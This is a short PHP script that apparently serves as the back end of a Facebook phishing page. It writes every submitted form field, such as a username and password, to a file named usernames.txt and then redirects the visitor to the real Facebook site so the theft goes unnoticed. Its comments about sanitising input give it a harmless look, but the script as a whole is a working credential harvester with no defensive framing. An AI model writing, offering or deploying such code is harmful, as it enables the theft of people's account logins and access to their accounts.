<?php
$redirectUrl = 'https://www.facebook.com';

// Validate and sanitize input, e.g., using htmlspecialchars
foreach ($_POST as $variable => $value) {
    $_POST[$variable] = htmlspecialchars($value);
}

// Open file in append mode
$handle = fopen("usernames.txt", "a");

// Check if the file handle is valid
if ($handle !== false) {
    // Write data to the file
    foreach ($_POST as $variable => $value) {
        fwrite($handle, $variable . "=" . $value . "\r\n");
    }

    fwrite($handle, "\r\n");

    // Close the file handle
    fclose($handle);
}

// Perform the redirect
header("Location: $redirectUrl");
exit;
?>
